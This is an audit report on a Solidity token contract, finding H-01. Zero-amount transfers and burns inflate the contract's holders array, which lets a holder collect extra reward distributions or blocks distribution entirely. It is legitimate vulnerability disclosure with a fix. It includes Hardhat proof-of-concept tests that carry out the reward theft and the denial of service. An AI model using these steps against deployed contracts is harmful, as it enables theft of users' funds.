# 2024-02-althea-liquid-infrastructure Report

## [H-01] Holders array can be manipulated by transferring or burning with amount 0, stealing rewards or bricking certain functions

*Submitted by BowTiedOriole, also found by 0xJoyBoy03 (1, 2), pontifex, 0x0bserver, psb01, ReadyPlayer2, rouhsamad, CodeWasp, DanielArmstrong, n0kto, 0xpiken, Krace (1, 2), nuthan2x (1, 2), spark, kinda_very_good (1, 2), 0xlamide, pynschon, gesha17, MrPotatoMagic, Brenzee, Honour, DarkTower, turvy_fuzz, Fitro, shaflow2, Babylen, slippopz, d3e4, matejdb (1, 2), web3pwn, max10afternoon (1, 2), 0xAadi (1, 2), JohnSmith, miaowu, Myrault, krikolkk, TheSavageTeddy (1, 2), SovaSlava, atoko, Breeje, cryptphi, 0xlemon, SpicyMeatball, Tigerfrake, parlayan_yildizlar_takimi, csanuragjain, petro_1912, zhaojohnson, peanuts, and Fassi_Security*

[https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/main/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L214-L231](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/main/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L214-L231)

`LiquidInfrastructureERC20._beforeTokenTransfer()` checks if the `to` address has a balance of `0` , and if so, adds the address to the holders array.

[LiquidInfrastructureERC20#L142-145](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/main/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L142-L145)

```
bool exists = (this.balanceOf(to) != 0);
if (!exists) {
    holders.push(to);
}
```

However, the ERC20 contract allows for transferring and burning with `amount = 0` , enabling users to manipulate the holders array.

An approved user that has yet to receive tokens can initiate a transfer from another address to themself with an amount of `0` . This enables them to add their address to the holders array multiple times. Then, `LiquidInfrastructureERC20.distribute()` will loop through the user multiple times and give the user more rewards than it should.

```
for (i = nextDistributionRecipient; i < limit; i++) {
    address recipient = holders[i];
    if (isApprovedHolder(recipient)) {
        uint256[] memory receipts = new uint256[](
            distributableERC20s.length
        );
        for (uint j = 0; j < distributableERC20s.length; j++) {
            IERC20 toDistribute = IERC20(distributableERC20s[j]);
            uint256 entitlement = erc20EntitlementPerUnit[j] *
                this.balanceOf(recipient);
            if (toDistribute.transfer(recipient, entitlement)) {
                receipts[j] = entitlement;
            }
        }

        emit Distribution(recipient, distributableERC20s, receipts);
    }
}
```

This also enables any user to call burn with an amount of `0` , which will push the zero address to the holders array causing it to become very large and prevent `LiquidInfrastructureERC20.distributeToAllHolders()` from executing.

```
it("malicious user can add himself to holders array multiple times and steal rewards", async function () {
    const { infraERC20, erc20Owner, nftAccount1, holder1, holder2 } = await liquidErc20Fixture();
    const nft = await deployLiquidNFT(nftAccount1);
    const erc20 = await deployERC20A(erc20Owner);

    await nft.setThresholds([await erc20.getAddress()], [parseEther('100')]);
    await nft.transferFrom(nftAccount1.address, await infraERC20.getAddress(), await nft.AccountId());
    await infraERC20.addManagedNFT(await nft.getAddress());
    await infraERC20.setDistributableERC20s([await erc20.getAddress()]);

    const OTHER_ADDRESS = '0x1111111111111111111111111111111111111111'

    await infraERC20.approveHolder(holder1.address);
    await infraERC20.approveHolder(holder2.address);

    // Malicious user transfers 0 to himself to add himself to the holders array
    await infraERC20.transferFrom(OTHER_ADDRESS, holder1.address, 0);

    // Setup balances
    await infraERC20.mint(holder1.address, parseEther('1'));
    await infraERC20.mint(holder2.address, parseEther('1'));
    await erc20.mint(await nft.getAddress(), parseEther('2'));
    await infraERC20.withdrawFromAllManagedNFTs();

    // Distribute to all holders fails because holder1 is in the holders array twice
    // Calling distribute with 2 sends all funds to holder1
    await mine(500);
    await expect(infraERC20.distributeToAllHolders()).to.be.reverted;
    await expect(() => infraERC20.distribute(2))
        .to.changeTokenBalances(erc20, [holder1, holder2], [parseEther('2'), parseEther('0')]);
    expect(await erc20.balanceOf(await infraERC20.getAddress())).to.eq(parseEther('0'));
});

it("malicious user can add zero address to holders array", async function () {
    const { infraERC20, erc20Owner, nftAccount1, holder1 } = await liquidErc20Fixture();

    for (let i = 0; i < 10; i++) {
        await infraERC20.burn(0);
    }
    // I added a getHolders view function to better see this vulnerability
    expect((await infraERC20.getHolders()).length).to.eq(10);
});
```

Adjust the logic in `_beforeTokenTransfer` to ignore burns, transfers where the amount is `0` , and transfers where the recipient already has a positive balance.

```
function _beforeTokenTransfer(
    address from,
    address to,
    uint256 amount
) internal virtual override {
    require(!LockedForDistribution, "distribution in progress");
    if (!(to == address(0))) {
        require(
            isApprovedHolder(to),
            "receiver not approved to hold the token"
        );
    }
    if (from == address(0) || to == address(0)) {
        _beforeMintOrBurn();
    }
-   bool exists = (this.balanceOf(to) != 0);
-   if (!exists) {
+   if (to != address(0) && balanceOf(to) == 0 && amount > 0)
       holders.push(to);
   }
}
```

Token Transfer

**ChristianBorst (Althea) confirmed and commented:**

> This is a significant issue since it is a DoS attack vector and can cause miscalculation of entitlements. I also think the report is very clear in outlining the issue.
